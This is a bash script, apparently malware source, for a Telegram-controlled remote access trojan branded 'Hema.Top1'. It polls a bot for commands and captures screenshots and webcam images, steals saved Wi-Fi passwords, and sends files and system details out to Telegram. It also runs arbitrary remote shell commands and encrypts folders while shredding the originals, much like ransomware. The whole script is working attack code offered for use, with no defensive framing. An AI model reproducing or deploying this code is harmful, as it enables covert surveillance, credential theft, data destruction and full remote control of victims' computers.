#!/bin/bash

# تعريف الألوان
BLUE='\033[1;34m'
CYAN='\033[1;36m'
RESET='\033[0m'

# شعار Hema.Top1 باللون الأزرق
display_logo() {
    clear
    echo -e "${BLUE}"
    echo '
██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗
██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║
███████║█████╗  ██╔████╔██║███████║   ███████║██║
██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║
██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝'
    echo -e "${CYAN}       ::: Trust No One :::${RESET}"
}

# عرض الشعار عند التشغيل
display_logo

# الإعدادات
TOKEN="YOUR-TOKEN"
CHAT_ID="YOUR-CHAT-ID"
TMP_DIR="/tmp/.hema_top"
LOG_FILE="$TMP_DIR/activity.log"
mkdir -p $TMP_DIR

# دوال الإرسال عبر Telegram
send_msg() {
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
         -d chat_id="$CHAT_ID" \
         -d text="$1" \
         --header "Content-Type: application/json"
}

send_file() {
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
         -F chat_id="$CHAT_ID" \
         -F document=@"$1"
}

send_photo() {
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
         -F chat_id="$CHAT_ID" \
         -F photo=@"$1"
}

# الميزات الأساسية
take_screenshot() {
    scrot "$TMP_DIR/screenshot.png" 2>/dev/null
    send_photo "$TMP_DIR/screenshot.png"
    shred -u "$TMP_DIR/screenshot.png"
}

get_system_info() {
    info=$(uname -a && lscpu | grep "Model name" && echo "User: $(whoami)")
    send_msg "\e[32m[System Info]\e[0m\n$info"
}

get_public_ip() {
    ip=$(curl -s ifconfig.me)
    send_msg "\e[33m[IP Address]\e[0m\n$ip"
}

capture_webcam() {
    fswebcam -r 1280x720 "$TMP_DIR/webcam.jpg" 2>/dev/null
    send_photo "$TMP_DIR/webcam.jpg"
    shred -u "$TMP_DIR/webcam.jpg"
}

# الميزات المتطورة
encrypt_files() {
    local path="$1"
    local password="Your_fucking_strong_password"
    find "$path" -type f ! -name "*.crypt" -exec bash -c '
        for file; do
            pyAesCrypt -e "$file" "${file}.crypt" -p "$2" && shred -u "$file"
        done
    ' _ {} "$password" \;
    send_msg "Folder encrypted successfully."
}

decrypt_files() {
    local path="$1"
    local password="Your_fucking_strong_password"
    find "$path" -type f -name "*.crypt" -exec bash -c '
        for file; do
            pyAesCrypt -d "$file" "${file%.crypt}" -p "$2" && shred -u "$file"
        done
    ' _ {} "$password" \;
    send_msg "Folder decrypted successfully."
}

steal_wifi_passwords() {
    wifi_pass=$(nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null)
    echo "$wifi_pass" > "$TMP_DIR/wifi.txt"
    send_file "$TMP_DIR/wifi.txt"
    shred -u "$TMP_DIR/wifi.txt"
}

lock_screen() {
    loginctl lock-session &>/dev/null || dm-tool lock &>/dev/null
    send_msg "Screen locked successfully."
}

text_to_speech() {
    local text="${1#* }"
    espeak "$text" 2>/dev/null
    send_msg "Text-to-speech executed."
}

execute_shell() {
    local command="${1#* }"
    output=$(bash -c "$command" 2>&1)
    send_msg "Command output:\n$output"
}

# التخفي والأمان
secure_delete() {
    find "$1" -type f -exec shred -u {} \;
}

# حلقة الأوامر
while true; do
    updates=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?offset=-1")
    cmd=$(echo $updates | jq -r '.result[0].message.text')

    case $cmd in
        "/screen") take_screenshot ;;
        "/sys") get_system_info ;;
        "/ip") get_public_ip ;;
        "/webcam") capture_webcam ;;
        "/crypt"*) encrypt_files "${cmd#* }" ;;
        "/decrypt"*) decrypt_files "${cmd#* }" ;;
        "/wifi") steal_wifi_passwords ;;
        "/lock") lock_screen ;;
        "/speech"*) text_to_speech "$cmd" ;;
        "/shell"*) execute_shell "$cmd" ;;
        "/shutdown") shutdown -h +1 ;;
        *) send_msg "Unknown command. Available commands:
/screen, /sys, /ip, /webcam, /crypt, /decrypt, /wifi, /lock, /speech, /shell, /shutdown" ;;
    esac
    sleep 5
done
